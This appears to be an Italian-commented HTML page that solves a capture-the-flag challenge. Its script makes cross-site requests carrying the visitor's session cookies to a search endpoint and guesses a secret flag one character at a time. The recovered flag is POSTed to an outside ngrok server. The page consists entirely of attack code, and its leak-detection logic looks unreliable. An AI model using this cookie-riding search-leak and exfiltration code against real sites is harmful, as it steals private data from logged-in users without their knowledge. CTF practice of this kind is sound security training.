<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rubare Flag</title>
</head>
<body>
    <h1>Rubare la Flag dell'Architetto</h1>
    <div id="results"></div>

    <script>
        const baseUrl = 'https://matrix.capturetheflags.site/search?s=';
        let currentFlag = 'flag{'; // Iniziamo con "flag{"
        let position = currentFlag.length; // Imposta la posizione all'inizio della flag

        // Funzione per testare i caratteri della flag
        const testChar = () => {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\'; // Caratteri da testare
            
            // Ciclo attraverso i caratteri
            for (let char of chars) {
                const query = `${baseUrl}${currentFlag}${char}`; // Crea la query
                fetch(query, {
                    method: 'GET',
                    credentials: 'include', // Include i cookie di sessione
                    mode: 'cors' // Imposta CORS
                })
                .then(response => {
                    if (response.ok) {
                        console.log(`Trovato carattere ${char} per la posizione ${position}`);
                        currentFlag += char; // Aggiungi il carattere trovato
                        position++; // Incrementa la posizione
                        testChar(); // Chiama ricorsivamente per testare il prossimo carattere
                        document.getElementById('results').innerText = `Flag parziale: ${currentFlag}`; // Mostra il progresso
                        return; // Esci dalla funzione per non continuare con il ciclo
                    } else {
                        console.log(`Carattere ${char} non valido per la posizione ${position}`);
                        // Se un carattere non Ã¨ valido e siamo all'ultima posizione testata
                        if (currentFlag.length > 5) { // Almeno "flag{" deve essere presente
                            console.log(`Flag completata: ${currentFlag}`);
                            document.getElementById('results').innerText = `Flag completata: ${currentFlag}`;
                            // Invia la flag al server Flask
                            fetch('https://9e94-87-4-142-72.ngrok-free.app/receive_flag', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded',
                                },
                                body: `flag=${encodeURIComponent(currentFlag)}` // Invia la flag
                            })
                            .then(response => response.text())
                            .then(data => console.log(data))
                            .catch(error => console.error('Errore:', error));
                        }
                    }
                })
                .catch(error => console.error('Errore:', error));
            }
        };

        // Inizia il processo di test dei caratteri
        testChar();
    </script>
</body>
</html>
